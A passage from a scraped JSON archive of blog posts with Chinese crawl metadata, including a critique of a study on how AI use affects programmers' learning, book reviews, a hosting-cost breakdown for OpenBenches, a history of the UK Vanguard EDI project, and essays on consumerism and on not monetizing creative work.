cells.\\n Standard cells made it to the cover of Digital Design in August 1985, and the article inside described numerous vendors and products.\\n Companies like Zymos and VLSI Technology (VTI) focused on standard cells.\\n Traditional companies such as Texas Instruments , NCR, GE/RCA, Fairchild , Harris, ITT , and Thomson introduced lines of standard cell products in\\n the mid-1980s.\\n \\n \u21a9 \\n \\n \\n '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:51:49</p>"},{"location":"seangoedecke.com/","title":"seangoedecke.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>How does AI impact skill formation- 20260131</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"seangoedecke.com/How%20does%20AI%20impact%20skill%20formation-_20260131/","title":"How does AI impact skill formation?","text":"<p>\u6765\u6e90: seangoedecke.com \u53d1\u5e03\u65f6\u95f4: Sat, 31 Jan 2026 00:00:00 GMT \u94fe\u63a5: https://seangoedecke.com/how-does-ai-impact-skill-formation/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.seangoedecke.com/rss.xml', 'value': '<p>Two days ago, the Anthropic Fellows program released a paper called How AI Impacts Skill Formation. Like other papers on AI before it, this one is being treated as proof that AI makes you slower and dumber. Does it prove that?</p>\\n<p>The structure of the paper is sort of similar to the 2025 MIT study Your Brain on ChatGPT. They got a group of people to perform a cognitive task that required learning a new skill: in this case, the Python Trio library. Half of those people were required to use AI and half were forbidden from using it. The researchers then quizzed those people to see how much information they retained about Trio.</p>\\n<p>The banner result was that AI users did not complete the task faster, but performed much worse on the quiz. If you were so inclined, you could naturally conclude that any perceived AI speedup is illusory, and the people who are using AI tooling are cooking their brains. But I don\u2019t think that conclusion is reasonable.</p>\\nRetyping AI-generated code\\n<p>To see why, let\u2019s look at Figure 13 from the paper:</p>\\n<p>\\n      \\n    \\n  \\n  \\n    </p>\\n<p>The researchers noticed half of the AI-using cohort spent most of their time literally retyping the AI-generated code into their solution, instead of copy-pasting or \u201cmanual coding\u201d: writing their code from scratch with light AI guidance. If you ignore the people who spent most of their time retyping, the AI-users were 25% faster.</p>\\n<p>I confess that this kind of baffles me. What kind of person manually retypes AI-generated code? Did they not know how to copy and paste (unlikely, since the study was mostly composed of professional or hobby developers<sup>1</sup>)? It certainly didn\u2019t help them on the quiz score. The retypers got the same (low) scores as the pure copy-pasters.</p>\\n<p>In any case, if you know how to copy-paste or use an AI agent, I wouldn\u2019t use this paper as evidence that AI will not be able to speed you up. </p>\\nWhat about the quiz scores?\\n<p>Even if AI use offers a 25% speedup, is that worth sacrificing the opportunity to learn new skills? What about the quiz scores?</p>\\n<p>Well, first we should note that the AI users who used the AI for general questions but wrote all their own code did fine on the quiz. If you look at Figure 13 above, you can see that those AI users averaged maybe a point lower on the quiz - not bad, for people working 25% faster. So at least some kinds of AI use seem fine.</p>\\n<p>But of course much current AI use is not like this: if you\u2019re using Claude Code or Copilot agent mode, you\u2019re getting the AI to do the code writing for you. Are you losing key skills by doing that?</p>\\n<p>Well yes, of course you are. If you complete a task in ten minutes by throwing it at a LLM, you will learn much less about the codebase than if you\u2019d spent an hour doing it by hand. I think it\u2019s pretty silly to deny this: it\u2019s intuitively right, and anybody who has used AI agents extensively at work can attest to it from their own experience.</p>\\n<p>Still, I have two points to make about this.</p>\\nSoftware engineers are paid to ship, not to learn\\n<p>First, software engineers are not paid to learn about the codebase. We are paid to deliver business value (typically by delivering working code). If AI can speed that up dramatically, avoiding it makes you worse at your job, even if you\u2019re learning more efficiently. That\u2019s a bit unfortunate for us - it was very nice when we could get much better at the job simply by doing it more - but that doesn\u2019t make it false.</p>\\n<p>Other professions have been dealing with this forever. Doctors are expected to spend a lot of time in classes and professional development courses, learning how to do their job in other ways than just doing it. It may be that future software engineers will need to spend 20% of their time manually studying their codebases: not just in the course of doing some task (which could be far more quickly done by AI agents) but just to stay up-to-date enough that their skills don\u2019t atrophy.</p>\\nMoving faster gives you more opportunities to learn\\n<p>The other point I wanted to make is that even if your learning rate is slower, moving faster means you may learn more overall. Suppose using AI meant that you learned only 75% as much as non-AI programmers from any given task. Whether you\u2019re learning less overall depends on how many more tasks you\u2019re doing. If you\u2019re working faster, the loss of learning efficiency may be balanced out by volume.</p>\\n<p>I don\u2019t know if this is true. I suspect there really is no substitute for painstakingly working through a codebase by hand. But the engineer who is shipping 2x as many changes is probably also learning things that the slower, manual engineer does not know. At minimum, they\u2019ll be acquiring a greater breadth of knowledge of different subsystems, even if their depth suffers.</p>\\n<p>Anyway, the point is simply that a lower learning rate does not by itself prove that less learning is happening overall.</p>\\nWe need to talk about GPT-4o\\n<p>Finally, I will reluctantly point out that the model used for this task was GPT-4o (see section 4.1). I\u2019m reluctant here because I sympathize with the AI skeptics, who are perpetually frustrated by the pro-AI response of \u201cwell, you just haven\u2019t tried the right model\u201d. In a world where new AI models are released every month or two, demanding that people always study the best model makes it functionally impossible to study AI use at all.</p>\\n<p>Still, I\u2019m just kind of confused about why GPT-4o was chosen. This study was funded by Anthropic, who have much better models. This study was conducted in 2025<sup>2</sup>, at least six months after the release of GPT-4o (that\u2019s like five years in AI time). I can\u2019t help but wonder if the AI-users cohort would have run into fewer problems with a more powerful model.</p>\\nSummary\\n<p>I don\u2019t have any real problem with this paper. They set out to study how different patterns of AI use affect learning, and their main conclusion - that pure \u201cjust give the problem to the model\u201d AI use means you learn a lot less - seems correct to me.</p>\\n<p>I don\u2019t like their conclusion that AI use doesn\u2019t speed you up, since it relies on the fact that 50% of their participants spent their time literally retyping AI code. I wish they\u2019d been more explicit in the introduction that this was the case, but I don\u2019t really blame them for the result - I\u2019m more inclined to blame the study participants themselves, who should have known better.</p>\\n<p>Overall, I don\u2019t think this paper provides much new ammunition to the AI skeptic. Like I said above, it doesn\u2019t support the point that AI speedup is a mirage. And the point it does support (that AI use means you learn less) is obvious. Nobody seriously believes that typing \u201cbuild me a todo app\u201d into Claude Code means you\u2019ll learn as much as if you built it by hand.</p>\\n<p>That said, I\u2019d like to see more investigation into long-term patterns of AI use in tech companies. Is the slower learning rate per-task balanced out by the higher rate of task completion? Can it be replaced by carving out explicit time to study the codebase? It\u2019s probably too early to answer these questions - strong coding agents have only been around for a handful of months - but the answers may determine what it\u2019s like to be a software engineer for the next decade.</p>\\n<p>edit: the popular tech youtuber Theo cited this post as a source for his video on this paper. I liked Theo\u2019s video. I don\u2019t agree with his point about adjusting to a new setup - in my view that would also apply to the non-AI-using group - and I thought the crack about the kind of people who make syntax errors in Python was a bit uncalled-for. However, I agree that (a) the people in the study are not incentivized to spend time teaching themselves about Trio, and (b) this study does not do anywhere near as good a job at targeting real-world use as the well-known METR study.</p>\\n\\n\\n<ol>\\n<li>\\n<p>See Figure 17.</p>\\n\u21a9\\n</li>\\n<li>\\n<p>I suppose the study doesn\u2019t say that explicitly, but the Anthropic Fellows program was only launched in December 2024, and the paper was published in January 2026.</p>\\n\u21a9\\n</li>\\n</ol>\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"shkspr.mobi/","title":"shkspr.mobi","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Book Review- The Examiner - Janice Hallett \u2605\u2605\u2605\u2605\u2bea_20260204</li> <li>Book Review- The Voyage of the Space Beagle by Alfred Elton Van Vogt \u2605\u2605\u2606\u2606\u2606_20260202</li> <li>Book Review- With the End in Mind - Dying, Death and Wisdom in an Age of Denial by Kathryn Mannix \u2605\u2605_20260131</li> <li>The cost of running OpenBenches.org_20260203</li> <li>Vanguard - The Government Project to get British Businesses to use the Internet_20260201</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"shkspr.mobi/Book%20Review-%20The%20Examiner%20-%20Janice%20Hallett%20%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%AF%AA_20260204/","title":"Book Review: The Examiner - Janice Hallett \u2605\u2605\u2605\u2605\u2bea","text":"<p>\u6765\u6e90: shkspr.mobi \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 12:34:22 +0000 \u94fe\u63a5: https://shkspr.mobi/blog/2026/02/book-review-the-examiner-janice-hallett/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' \\n\\n I\\'ve thoroughly enjoyed all of Janice Hallett\\'s previous crime books . The Examiner is, frankly, more of the same - and I\\'m happy with that! \\n\\n You, the reader, are given a series of transcripts and have to work out what crime (if any) has been committed. You don\\'t find out who the victim(s) is/are until reasonably far through the story. The characters are well realised (although a little similar to some of her others). The twists are shockingly good and will make you flick back to see if you could have spotted them. \\n\\n Hallett is exquisite at building tension through the slow drip-drip-drip of reveals. OK, so the transcripts are a bit unrealistic but they make a good scaffold. While it might be nice to include user avatars on the WhatsApp messages, the characters\\' voices are unique enough to distinguish them easily. \\n\\n Much like The Mysterious Case of the Alperton Angels , the book plays around with symbolism and the nature of faith. You may find yourself sympathising with the characters and then quickly recanting! \\n\\n Technical Issues \\n\\n Viper, the publisher, seem to have messed up the structure of this eBook. Despite being published in 2024, they\\'re using an ancient and obsolete version of the Blitz ePub CSS which itself was archived back in 2020. As well as strange indents, there\\'s a hard-coded 2em margin only on the right. \\n\\n Accessibility is poor. All the abbreviations use the  element. But some kind of automated find-and-replace has mangled most of them. For example, the \"Masters degree in Multimedia Art (Full-Time Programme)\" is shortened to \"MMAM(FTP)\" and then given the nonsensical abbreviation of \"Molecular Area Per Molecule (File Transfer Protocol)\"! \\n\\n Much like before I\\'ve written to them asking them to correct it. '} <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:02</p>"},{"location":"shkspr.mobi/Book%20Review-%20The%20Voyage%20of%20the%20Space%20Beagle%20by%20Alfred%20Elton%20Van%20Vogt%20%E2%98%85%E2%98%85%E2%98%86%E2%98%86%E2%98%86_20260202/","title":"Book Review: The Voyage of the Space Beagle by Alfred Elton Van Vogt \u2605\u2605\u2606\u2606\u2606","text":"<p>\u6765\u6e90: shkspr.mobi \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 12:34:39 +0000 \u94fe\u63a5: https://shkspr.mobi/blog/2026/02/book-review-the-voyage-of-the-space-beagle-by-alfred-elton-van-vogt/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' \\n\\n This is Star Trek before Star Trek. It is Alien long before Alien. It is the template for so much modern science fiction. What it is not is particularly good. \\n\\n I don\\'t intend to dump on the classics (and this is undoubtedly a classic) but 1950s sci-fi takes place in an almost alien media environment. Even if you ignore the anachronisms ( like having to develop film in order to see photographs ) and the archaic language (lots of vibrators being used against a big pussy) it is hard to get over how unconvincing it all is. \\n\\n In the first story, the crew of the Space Beagle find an alien monster. It probably killed one of them. They bring it aboard and just let it lounge about in the library! Yes, all the science is fun, and the \"competency porn\" of the professional crew is suitably heroic, but the characters and their motivations are frequently bizarre. It is only through the complete absence of girls (urgh!) that there\\'s no interstellar sexism. \\n\\n The protagonist, Grosvenor, is a cipher for every geeky kid who ever felt he was smarter than everyone else. He is a sneering, taciturn, and deeply unpleasant character. When given the opportunity, he relishes the chance to become dictator. \\n\\n Because the book started life as a set of short stories, it works reasonably well as a \"monster of the week\" show. It is episodic, with well-placed cliffhangers. The science is very sciency with some excellent speculative elements. You\\'ve got aliens planting eggs in people (like Alien) and a ship\\'s engineer who says \"Nooo! The walls couldn\\'t stand it. They\\'d melt.\" (like Scotty) and any number of concepts you\\'ll recognise from your favourite TV shows. \\n\\n The obsession with hypnotism and mind-control feels a bit icky, especially when understood in association with the author\\'s dalliance with the pseudoscience of Dianetics. \\n\\n The language (when not steeped in 1950\\'s idiomatic phrasing) can verge on the poetic. Every story includes a chapter or two from the alien\\'s viewpoint. They are deliciously weird and elevate this book beyond what might be a slightly forgettable slice of sci-fi. \\n\\n It is absolutely worth reading - if only to see how influential it has been - but it can be a bit of a weird slog at times. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:05</p>"},{"location":"shkspr.mobi/Book%20Review-%20With%20the%20End%20in%20Mind%20-%20Dying%2C%20Death%20and%20Wisdom%20in%20an%20Age%20of%20Denial%20by%20Kathryn%20Mannix%20%E2%98%85%E2%98%85_20260131/","title":"Book Review: With the End in Mind - Dying, Death and Wisdom in an Age of Denial by Kathryn Mannix \u2605\u2605\u2605\u2bea\u2606","text":"<p>\u6765\u6e90: shkspr.mobi \u53d1\u5e03\u65f6\u95f4: Sat, 31 Jan 2026 12:34:55 +0000 \u94fe\u63a5: https://shkspr.mobi/blog/2026/01/book-review-with-the-end-in-mind-dying-death-and-wisdom-in-an-age-of-denial-by-kathryn-mannix/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' \\n\\n Is it possible to \"die well\"? We have midwives for births, should we have \"deathwives\" for the other end of our lives? I think this book was recommended to me in the depths of the pandemic. I was too much of a chicken to read it while those around me were dying. The book aims to normalise the process of death and mostly succeeds. Unlike a lot of books, it doesn\\'t just identify a problem - it provides pages of solutions. Every chapter ends with a series of questions to ask yourself (or your loved ones) about death. \\n\\n At times, it is utterly heartbreaking and more than a little gruesome. Death is emotionally and physically distressing. Similarly, there are several stories which deal with the reality of assisted dying. I think the author comes down against euthanasia - but it certainly helps raise questions of whether repeatedly offering the option amounts to pressuring them into an unwanted decision. \\n\\n It is a bit homespun and cloying. I felt like it painted quite a rosy picture of what death can look like. All the nurses are angels and the doctors have endless patience, there\\'s always time for a cuppa and deathbed revelations are never awkward. \\n\\n Oh, and there\\'s a lovely aside about memorial benches being harbingers of doom, which I found quite amusing! \\n\\n This will probably sit unread on your ebook for far too long - but it is worth cracking it open and thinking about the questions it raises. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:09</p>"},{"location":"shkspr.mobi/The%20cost%20of%20running%20OpenBenches.org_20260203/","title":"The cost of running OpenBenches.org","text":"<p>\u6765\u6e90: shkspr.mobi \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 12:34:16 +0000 \u94fe\u63a5: https://shkspr.mobi/blog/2026/02/the-cost-of-running-openbenches-org/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' After my recent presentation at FOSDEM, someone asked a pretty reasonable question. What does it cost to run OpenBenches ? \\n\\n It is, thankfully, surprisingly cheap! In part, that\\'s because it is a relatively simple tech stack - PHP, MySQL, a couple of API calls to external services. It was designed to be as low cost while also being useful. Here\\'s the breakdown: \\n\\n Hosting - \u00a3171 per year \\n\\n Our biggest expense but, I think, our most reasonable. Krystal charges around \u00a3342 for a 2 year contract. That includes unlimited bandwidth and storage, as well as the domain name.  We have nearly 400GB of photos and bot scraping means we can use over 900GB of bandwidth per month - so Krystal give us a rather good deal! \\n\\n \\n\\n Use this affiliate link and code EDENT to get a small discount. \\n\\n Stadia Maps - US$20 / month \\n\\n Geocoding is surprisingly hard to do locally. We need to transform latitude and longitude into addresses, and then back again. Stadia Maps cost about the same as our hosting! What\\'s rather annoying is that we only use about half the API calls in our plan. We need to find a cheaper solution. \\n\\n Mapping - Free! \\n\\n When we used Stadia for drawing maps, we regularly ran over our quota. So we switched to OpenFreeMap which produces gorgeous interactive maps. \\n\\n The service has been rock solid and very responsive to bugs on GitHub. \\n\\n Logo - US$5 \\n\\n I\\'m not a good designer, so we bought a logo from The Noun Project and then coloured it in. Bargain for a fiver! \\n\\n Image CDN - Free! \\n\\n Although we have unlimited bandwidth with Krystal, we\\'re only located in one region - the UK. WeServ . It\\'s also pointless serving full resolution images to small screens. \\n\\n So WeServ offers free image resizing and global CDNs. Personally, I\\'m not a fan of CloudFlare (their CDN partner) so I\\'m looking to change provider. \\n\\n OCR - Free! \\n\\n People don\\'t want to type in the inscription of the photo, so we use Google Cloud Vision . \\n\\n We send less than 1,000 requests per month - so we\\'re inside their free tier . If we get more popular, that\\'ll get more expensive. But I don\\'t know of a local-first OCR which is as good as Google\\'s. Sadly, Tesseract is rubbish for extracting text from photos. \\n\\n Authentication - Free! \\n\\n We don\\'t want to store anyone\\'s passwords. The free tier of Auth0 allows us to do social login for up to 25,000 monthly users. Which is more than enough for us. \\n\\n Sadly, Auth0 don\\'t support the Fediverse, so I had to build my own \"Log-in with Mastodon\" service . \\n\\n As much as we\\'d like to run social login locally, we simply don\\'t want to be responsible for securing users\\' details &amp; API keys. \\n\\n Software - Free! \\n\\n As per the OpenBenches colophon we use a lot of cool FOSS. Small JS libraries, big PHP frameworks, and everything in between. \\n\\n Income \\n\\n Thanks to GitHub Sponsors we make a whopping US$3 per month! \\n\\n Similarly, our OpenCollective Sponsors brings in about \u00a33 per month. \\n\\n Merchandising! You can buy OpenBenches branded t-shirts, mugs, and hats . That nets us about \u00a320 per year \\n\\n Call it roughly \u00a380 income. OK, it is better than nothing - but doesn\\'t even cover a quarter of our costs. Sometimes people give us a higher donation privately, which is also very welcome. These people are listed on our README . \\n\\n Total \\n\\n On the assumption that our time is worthless (ha!) and that we only rarely go over our providers\\' API limits, and we get in some revenue, the cost of running OpenBenches is less than \u00a3300 per year. \\n\\n That\\'s not bad for a fun little hobby. People certainly spend more than that on Funkopops, vaping, and mechanical keyboards! \\n\\n Nevertheless, I\\'m always slightly worried that we\\'ll go viral and have an unexpectedly high bill from our API providers. \\n\\n I would love to be able to hire a proper designer to make the site look a bit nicer. I also want to be able to buy a modern iPhone so that I can test it in the latest Safari. \\n\\n If you have any suggestions for cutting costs, or non-scummy ways to help us raise funds, please drop a comment below. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:04</p>"},{"location":"shkspr.mobi/Vanguard%20-%20The%20Government%20Project%20to%20get%20British%20Businesses%20to%20use%20the%20Internet_20260201/","title":"Vanguard - The Government Project to get British Businesses to use the Internet","text":"<p>\u6765\u6e90: shkspr.mobi \u53d1\u5e03\u65f6\u95f4: Sun, 01 Feb 2026 12:34:10 +0000 \u94fe\u63a5: https://shkspr.mobi/blog/2026/02/vanguard-the-government-project-to-get-british-businesses-to-use-the-internet/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Email isn\\'t an obvious business benefit. Imagine it is the early 1980s and you need to communicate with people across the country. A first-class letter will cost you 17p - about 60p in today\\'s money . The letter will be delivered the next day and you\\'ll have your answer back the day after. \\n\\n By contrast, a single computer terminal was likely to set you back around \u00a33,000 - and that\\'s before you take into account message transmission costs. That\\'s roughly the same price as sending over 8,000 letters.  Is that a sensible investment for the 1980\\'s businessman? \\n\\n In 1986, British Telecom started producing \"The Communications Programme\" which was \"a new video magazine produced exclusively for the top communications people in the UK\\'s largest organisations\". \\n\\n The show was distributed on video-tape and the archived shows are genuinely fascinating. They\\'re a mixture of business reporting, thinly veiled advertorials, and a glance at the future of digital services. \\n\\n Buried in the middle of episode 4 is this advert from the Department of Trade and Industry. \\n\\n \\n  \\n \\n\\n There\\'s very little online information about the \"Vanguard Project\" - it was a VADS initiative (Value Added Data Services) run by DTI, BT, IBM, INS, ISTEL, and FASTRAK. Some of those acronyms survive, some don\\'t! \\n\\n Its aim was to promote awareness of EDI and its potential for the United Kingdom. \\n\\n In 1986 the Department of Trade and Industry launched a project called Vanguard to promote the development of this kind of service in 10 different sectors including construction, educational supplies and wholesale food distribution. The major VADS suppliers (BT, IBM, INS, Istel and the Midland Bank) in the UK were heavily involved in the project from the beginning. \\n\\n Information Sources in Information Technology \\n\\n What\\'s \"EDI\"? \\n\\n Electronic Data Interchange. \\n\\n A means of transferring data between co-operating enterprises without having to print it out on one computer and key it into another. Requires agreement about standards (proprietary or otherwise). \\n\\n Did it work? Well, that\\'s hard to say! \\n\\n There\\'s a paper from 1989 called Survey of Electronic Data Interchange Users and Service Providers in the UK . It dives into the then current challenges of getting British businesses to adopt EDI. \\n\\n It quotes Sir John Harvey-Jones saying that most people running companies were: \\n\\n \u2026old people like me not familiar with the technological possibilities! We have great difficulty in making imaginative jumps to see the way in which the whole of our business can be reorganised, revitalised, set up in totally new ways, releasing energy and cost and putting us into the pole position. I can see abundant evidence that the full benefits of EDI will only be reaped by the companies where the Chief Executives is seized with enthusiasm for the potential prize he can grasp. \\n\\n Which still seems true today! Although over-enthusiasm has led us to a weird AI-in-everything future. \\n\\n The paper doesn\\'t talk about Vanguard specifically, although it does have this rather cute diagram adapted from one of its reports: \\n\\n \\n\\n Not quite the Gartner Hype Cycle! \\n\\n The paper concludes that: \\n\\n Unfortunately the zealots of EDI tend to be unable to \u2018sell\u2019 the benefits to management in most companies, and this is not helped by the way that many companies have been forced to trade electronically. Management tends to think that EDI is about computers, and because they think that computers are technical they abdicate responsibility with the cry of \u2018its all too difficult\u2019. This must be wrong. It is up to those who understand EDI to learn how to talk to management, and it is up to management to understand that not only is EDI not about technology, but even if it was it is still their responsibility. \\n\\n Again, true as it ever was! \\n\\n Nestled in the bibliography is this tantalising list of publications from the now-defunct Her Majesty\\'s Stationery Office: \\n\\n \\n\\n None of which appear to be online, although a few are in The British Library - and a few more available on Google Books \\n\\n The state awarded several contracts for Vanguard - most of which seemed to be in the training space. Here\\'s what The EDI handbook said about it : \\n\\n \\n\\n (My thanks to Don Thompson , Owen Boswarva , and Ms7821 for digging out some of those references.) \\n\\n Did it work? By the time I entered the workforce in the 1990s, it seemed like every desk had a computer. Although the Internet was in its infancy, email and electronic ordering was a normal part of business. The various proto-Internet protocols were still around, but were quickly being replaced. \\n\\n A thesis published in 1991 asked an important question: \\n\\n why should a non-interventionist Government as Thatchers become directly involved in developing the market and working together with private companies whose normal aim is to increase market share at the expense of their competitors rather, than cooperate with them? \\n\\n The impact of Electronic data interchange on Irish foreign trade and transport \\n\\n Metcalfe\\'s Law tells us that there is no value being the only business on a network. It simply isn\\'t rational to invest in connecting to a data service that no-one else is on. But the value of that network increases as more people and businesses get connected. If you\\'ve read The Entrepreneurial State , you\\'ll know that governments are often responsible for subsidising technological initiatives like this.  The state, its citizenry, and its businesses all benefit from the increased efficiencies of electronic communications, so it is only right that the state should bootstrap these sorts of projects. \\n\\n I sent an FoI request to find out more but it looks like all the information is now archived. \\n\\n If you know of any other sources of information about Project Vanguard - please leave a comment. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:07</p>"},{"location":"simone.org/","title":"simone.org\\n\\n\u7f51\u7ad9: https://simone.org\\nRSS: https://simone.org/feed/\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- The Postcard and the Thing Itself (On Falling in Love with Ideas)_20260205\\n- The Mirror With No Reflection_20260205\\n- Consumerism- The First Universal Religion Humans Actually Practice_20260205\\n- What If We Made Advertising Illegal-_20260205\\n- The Antiportfolio- Counter-advice for Aspiring Artists_20260205\\n","text":""},{"location":"simone.org/Consumerism-%20The%20First%20Universal%20Religion%20Humans%20Actually%20Practice_20260205/","title":"Consumerism: The First Universal Religion Humans Actually Practice\\n\\n\u6765\u6e90: https://simone.org\\n\u94fe\u63a5: https://simone.org/consumerism/\\n\u65e5\u671f: Thu, 01 May 2025 12:12:54 GMT\\n\\n---\\n\\nIf you ever stood outside the Fifth Avenue Apple Store in New York, you noticed how the glass cube rises like a minimalist temple, appearing even more ethereal than the Kaaba in Mecca.\\nOnce you see that, it's easy to realize how millions of consumers visiting it are on a pilgrimage of sorts. Inside, the Apple logo hangs luminous at the center, elevated and spotlit like the cross in churches to draw the eye upward. Ironic how the crucifix was replaced with a bitten apple, an ancient symbol of knowledge and temptation.\\nNew Apple devices used to feel like messianic revelations\u2014from stage introduction to store.\\nSteve Jobs always looked like a departed prophet. A secular saint, who suffered for our sin of technological inadequacy. He once noted how he'd be one of the last humans to die of such a disease, and I very much share that hope. Yet, that reduces salvation to a matter of flesh and successive product generations.\\nIt's not isolated to Apple, every brand does it: Tesla, Nike, Leica, CrossFit, Supreme. We adapted religious behavioral patterns to consumerism without\\nacknowledging the transfer\\n.\\nAfter Jobs, new deities emerged (even fell) from the techno-pantheon. Musk, promising Mars salvation. Altman, whose models promise vicarious omniscience. As products get mystical through LLMs, overlap with traditional religion intensifies. They offer knowledge, transcendence, soon even a simulacrum of afterlife through digital persistence.\\nPeople approach the Genius Bar with the same anxiety of my Catholic upbringing. The confession booth, reimagined: \u201cMy phone broke.\u201d Since those devices look perfect, it's\\nyou\\nwho must have failed\\nthem\\nas a devoted user. Repair is absolution via technical priesthood.\\nProducts rest on pedestals, with perfect lighting painting them more beautiful than anything in your life could ever be\u2014the same technique used in baroque churches to elevate relics and icons. In an era that lacks collective rituals, customer experience\\nbecomes liturgical\\n: careful removal of packaging, reverent first touches, fascination by the witnesses. Transcendence comes from presentation: you gaze, you aspire\u2014apotheosis of the tool. It's not by chance that Apple's early marketing labeled original fans \u201cevangelists.\u201d\\nIn fact, almighty\\ntools now reshape user desires\\nuntil it's the user serving the tool. Like in any major religion, the devotee ends up submitting to the faith\u2014the god. Which, in this case, is a holy trinity of Market, Product, and Technology.\\nI've visited Apple Stores in six countries. While each has its own architectural character, there's something familiar about the experience. The floating glass box in New York, the historic buildings in Paris, Milan, and Rome. The minimalist concrete in Tokyo. Yet, the internal liturgy remains identical. Like visiting different cathedrals within the same denomination.\\nBrands offer something now scarce: a complete worldview, aesthetically consistent and globally recognized. That is the real, invisible product.\\nWhen you jump ecosystems, you \u201cconvert\u201d to Android, to iOS, to macOS, or whatever Linux flavor you crave. Everyone knows a friend who has strong opinions about it. Are you that friend?\\nSo, the bitten apple, the evangelists, the conversion, the revelations, and the founder prophet\u2026 The bitten apple, the evangelists\u2026 \u201cAre you getting it? These are not separate devices, this is one device.\u201d\\nOne religion.\\nWhat we are seeking isn't gadgets\\n, but the meaning structure that religions provided. The most significant thing about modern consumerism isn't what it sells us, but what it asks us to believe.\\nNot just products improving our lives, but transcending ordinary existence through consumption. Purpose, community. Steam friends, iMessage groups. The brand narrative about reality\\nsupersedes the reality it describes\\n.\\nAgain: Apple is (was?) the clearest example, but the religion of consumption doesn't just transcend brands. It permeates through borders and faiths. In the 21st century, most share it: Christians and Muslims, Americans and Chinese, rich and poor.\\nConsumerism doesn't ask you to abandon old gods. It becomes the practical theology that governs your daily life. About 31% of humans identify as Christian, 25% as Muslim, and 15% as Hindu. But all practice product worshipification. Even atheists.\\nSo, is Consumerism an actual religion?\\nIt is, at least, the unconscious simulacra of it\u2014an anti-religion of sorts.\\nTake Buddhism: rather than a theistic religion, it is often described as a system of belief. So are markets and products when operating as a system of meaning and practice.\\nFor the first time in history, the world adheres to a unique system: Consumerism. Even in countries self-proclaimed \u201ccommunist,\u201d they practice capitalism of the state rather than of the private sector. Same stuff.\\nI find referring to people as \u201cconsumers\u201d very offensive and reductive. \u201cHow much can you consume?\u201d\\nYet, this is the point: in the church of commerce, your primary identity is a vessel for consumption. Your worth measured in purchasing power rather than anything else, like spiritual development.\\nThis is the\\nfinal commodification\\n: not the tool, but the spiritual value itself.\\nTranscendence, community, identity, purpose\u2014extracted from their traditional contexts and repackaged as products.\\nIn the Church of Consumerism, your soul is the product.\\nSign up for Simone\\nLife-flipping frameworks to reclaim your digital independence. Discover mindful creativity through photography and essays on using tools without being used by them.\\nSubscribe\\nEmail sent! Check your inbox to complete your signup.\\nNo spam. Unsubscribe anytime.","text":""},{"location":"simone.org/The%20Antiportfolio-%20Counter-advice%20for%20Aspiring%20Artists_20260205/","title":"The Antiportfolio: Counter-advice for Aspiring Artists\\n\\n\u6765\u6e90: https://simone.org\\n\u94fe\u63a5: https://simone.org/antiportfolio/\\n\u65e5\u671f: Sat, 01 Mar 2025 13:00:07 GMT\\n\\n---\\n\\nA student performer recently reached out to ask me about transitioning from college to \u201cthe real world\u201d while pursuing comedy and video production.\\nHis eyes lit up describing an intimate dorm room improv show he runs: 20\u201325 people packed in weekly for pure joy and experimentation. Then came a familiar tension: one friend urged him to monetize it immediately, while another suggested preserving its organic magic.\\nThere's tremendous pressure to monetize every passion.\\nThe value of an experience is not equivalent to its\\nmarket value\\n.\\nThe Pressure to Monetize\\nIn the connected but pre-algorithmic world of my late teens and 20s (during my \u201cprevious life\u201d in journalism and entertainment) I used to sleep two or three hours a night. I was possessed by an almost manic drive to promote every show, every project, every creative endeavor. At the time, it worked. I brute-forced a network effect around me.\\nAs I became a modest live radio host &amp; TV/web producer (and a\\nbridge builder\\nbetween European and American comedy scenes) I thought this relentless hustle was the only path forward for what I loved. Pack 100+ people into venues night after night, publish three videos per week, burn through social media campaigns and flyers\u2013all while trying to nurture the creative spark that drew me to comedy in the first place.\\nBut there's a darker side to ubiquitous\\nhustle culture\\n.\\nThe Hustle Trap and the Liberation Paradox\\nAt my lowest point, I had turned everything\u2013even writing and editing comedy scrips and videos\u2014into a task to be optimized. The joy was draining away, replaced by metrics and promotional strategies. It hasn't been until I separated my passions from my financial stability that I found an improved balance. Far from perfect, but a balance.\\nMy younger friend called it the \u201c\\n9-to-5 to fund 5-to-9\\n\u201d approach.\\nThat sums up the profound paradox in my journey:\\nI quit my passion as a job to follow my passion as a passion\\n. While conventional wisdom tells people to abandon stable employment to 'follow their dreams,' I did the reverse\u2014I needed to liberate my creative work from market pressures.\\nIn the current status of things, this feels like a practical compromise to me. The day job pays the bills, and finances your creative endeavors, allowing them to breathe without the suffocating pressure of paying rent. Sure, I could still use help paying for hosted services, maintenance, tools and, dare I say, more creative exploration shared into this world. That's why I started\\nS\u2605Projects\\n. But I believe in the ability to refuse having to monetize what brings you joy.\\n\u201cYou mean: it's okay to have a boring job.\u201d he acknowledged.\\nI get it: compromises feel like betrayal.\\nIf you can pay rent with what you love, great. At some point, just remember to ask yourself if what you make is for your enjoyment, or to chase 